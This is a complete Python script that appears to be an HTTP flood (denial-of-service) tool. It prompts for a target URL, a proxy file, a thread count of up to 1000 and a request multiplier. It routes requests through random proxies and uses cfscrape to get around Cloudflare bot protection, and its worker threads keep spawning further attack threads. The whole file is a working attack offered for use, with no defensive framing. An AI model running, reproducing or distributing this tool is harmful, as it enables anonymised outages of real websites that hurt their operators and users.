import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
from threading import Thread

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads Running : " + str(a+1))
	print("[!] Wait For Ready Threads...")
	time.sleep(20)
	input("[+] PRESS [ ENTER ] To START ATTACK")
	global oo
	oo = True
	
oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input( "[!] Target/Url : " ))
	list = str(input("[+] Proxy list (proxy.txt) : " ))
	pprr = open(list).readlines()
	time.sleep(1)
	print("[!] Proxy Count : " + "%d" %len(pprr))
	thr = int(input(f"[+] Threads (1-1000): " ))
	per = int(input("[!] Req Power (1-100) : "))
	opth()


def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(10)
	while True:
		while oo:
			try:
				s.get(url)
				print('PROXY ' + str(proxy[0])+":"+str(proxy[1]) + ' Attack ' +str(url) )
				try:
					for g in range(per):
						s.get(url)
						print('PROXY ' + str(proxy[0])+":"+str(proxy[1]) + ' Attack ' + str(url) ) 
						Thread(target=atk).start()
					#s.close()
				except:
					s.close()
			except:
				s.close()
				print("Proxy is not response..")
	

if __name__ == "__main__":
	main()